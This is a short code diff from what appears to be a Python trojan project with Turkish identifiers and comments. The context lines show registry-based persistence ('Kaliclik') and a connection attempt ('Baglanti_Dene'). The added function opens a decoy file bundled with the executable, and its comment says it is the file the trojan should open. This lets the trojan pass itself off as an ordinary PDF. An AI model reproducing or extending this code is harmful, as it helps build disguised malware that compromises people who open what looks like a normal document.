@@ -271,5 +271,11 @@ def Kaliclik():
         subprocess.call(regedit_komut,shell=True)
     if os.path.exists(tro_dosyasi):
         pass
+
+def Eklenmis_Dosya_Ac():
+    added_file = sys._MEIPASS + "\\ornekdosya.pdf" # '\\' dan sonra trojan ile açılmasını istediğiniz dosyayı yazınız.
+    subprocess.Popen(added_file,shell=True)
+
+#Eklenmis_Dosya_Ac()
 Kaliclik()
 Baglanti_Dene()
